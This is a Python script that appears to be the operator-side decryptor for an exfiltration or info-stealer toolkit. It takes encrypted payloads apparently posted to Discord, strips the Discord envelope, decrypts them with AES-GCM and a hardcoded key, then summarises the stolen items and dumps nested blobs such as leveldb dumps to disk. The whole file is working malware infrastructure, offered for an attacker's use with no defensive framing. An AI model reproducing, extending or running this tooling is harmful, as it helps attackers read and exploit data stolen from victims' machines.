#!/usr/bin/env python3
"""
Operator-side decryptor for svc exfil.

Unwraps payloads sent by svc-payload / any crypter-wrapped binary.

Usage:
    echo '<base64>' | python ops/decrypt.py
    python ops/decrypt.py ext_vault.bin
    python ops/decrypt.py msg.txt
    EXFIL_KEY=<hex> python ops/decrypt.py <file>
    python ops/decrypt.py ext_vault.bin --dump-blobs out/blobs
"""

import argparse
import base64
import json
import os
import re
import sys
from pathlib import Path

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Must match EXFIL_KEY_HEX in crates/common/src/envkey.rs
DEFAULT_KEY_HEX = "c734ac039aa425a799ea638f8c72904eeb628d2cd3b5934fb489ef27ffa038ef"


def load_key() -> bytes:
    key_hex = os.environ.get("EXFIL_KEY", DEFAULT_KEY_HEX)
    key = bytes.fromhex(key_hex)
    if len(key) != 32:
        sys.exit(f"[!] key must be 32 bytes (64 hex chars); got {len(key)}")
    return key


def strip_discord_envelope(raw: str) -> str:
    raw = raw.strip()

    if "```" in raw:
        m = re.search(r"```([A-Za-z0-9+/=\s]+)```", raw, re.DOTALL)
        if m:
            raw = m.group(1).strip()

    raw = re.sub(r"\s+", "", raw)

    if "\n" in raw:
        raw = raw.splitlines()[-1].strip()

    return raw


def decrypt_blob(key: bytes, blob_b64: str) -> dict:
    try:
        blob = base64.b64decode(blob_b64, validate=True)
    except Exception as e:
        sys.exit(f"[!] base64 decode failed: {e}")

    if len(blob) < 12 + 16:
        sys.exit(f"[!] blob too short ({len(blob)} bytes)")

    nonce = blob[:12]
    ct = blob[12:]
    try:
        pt = AESGCM(key).decrypt(nonce, ct, None)
    except Exception as e:
        sys.exit(
            f"[!] decryption failed: {e}\n"
            f"    wrong key, or blob corrupted in transit\n"
            f"    key fingerprint: {key.hex()[:16]}..."
        )

    try:
        return json.loads(pt)
    except Exception as e:
        sys.exit(f"[!] decrypted but not JSON: {e}\n    raw: {pt[:200]!r}")


def dump_nested_blobs(envelope: dict, out_dir: Path) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    tag = envelope.get("tag", "unknown")
    data = envelope.get("data")

    written = 0

    def consider(name: str, value):
        nonlocal written
        if not isinstance(value, str) or len(value) < 32:
            return
        if not re.fullmatch(r"[A-Za-z0-9+/=]+", value):
            return
        try:
            raw = base64.b64decode(value, validate=True)
        except Exception:
            return
        if len(raw) < 16:
            return
        idx = written
        written += 1
        path = out_dir / f"{tag}_{idx:04d}_{name}.bin"
        path.write_bytes(raw)
        print(f"    wrote {path} ({len(raw)} bytes)")

    if isinstance(data, list):
        for i, item in enumerate(data):
            if isinstance(item, dict):
                for k, v in item.items():
                    consider(f"{i}_{k}", v)
    elif isinstance(data, dict):
        for k, v in data.items():
            consider(k, v)

    if written == 0:
        print("    (no nested base64 blobs found)")


def summarize(envelope: dict) -> None:
    tag = envelope.get("tag", "?")
    data = envelope.get("data")
    print(f"[+] tag:   {tag}")
    print(f"[+] ts:    {envelope.get('ts')}")

    if isinstance(data, list):
        print(f"[+] items: {len(data)}")
        kinds = {}
        for item in data:
            if isinstance(item, dict):
                k = item.get("kind", item.get("src", "?"))
                kinds[k] = kinds.get(k, 0) + 1
        if kinds:
            print(
                f"[+] kinds: {dict(sorted(kinds.items(), key=lambda x: -x[1])[:10])}"
            )

    pretty = json.dumps(envelope, indent=2, ensure_ascii=False)
    if len(pretty) > 8000:
        print("[+] full json (truncated):")
        print(pretty[:8000])
        print(f"... ({len(pretty) - 8000} more chars)")
    else:
        print("[+] full json:")
        print(pretty)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument(
        "input",
        nargs="?",
        help="file containing the blob/message, or omit to read stdin",
    )
    ap.add_argument(
        "--dump-blobs",
        metavar="DIR",
        help="write nested base64 blobs (leveldb dumps, etc.) to DIR",
    )
    ap.add_argument(
        "--raw-json",
        action="store_true",
        help="print only the raw JSON, no summary lines",
    )
    args = ap.parse_args()

    if args.input:
        raw = Path(args.input).read_text()
    else:
        raw = sys.stdin.read()

    blob_b64 = strip_discord_envelope(raw)
    if not blob_b64:
        sys.exit("[!] no base64 found in input")

    key = load_key()
    envelope = decrypt_blob(key, blob_b64)

    if args.raw_json:
        print(json.dumps(envelope, indent=2, ensure_ascii=False))
    else:
        summarize(envelope)

    if args.dump_blobs:
        out = Path(args.dump_blobs)
        print(f"[+] dumping nested blobs to {out}")
        dump_nested_blobs(envelope, out)


if __name__ == "__main__":
    main()
